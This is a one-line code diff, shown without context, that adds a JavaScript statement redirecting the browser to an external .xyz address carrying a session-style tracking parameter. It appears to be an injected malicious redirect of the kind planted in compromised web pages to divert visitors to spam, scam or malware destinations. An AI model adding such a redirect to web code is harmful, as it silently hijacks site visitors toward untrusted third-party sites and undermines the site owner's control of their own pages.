@@ -1,0 +1,1 @@
+window.location.href = "https://matawan.xyz/HPt/go?sid=7744";
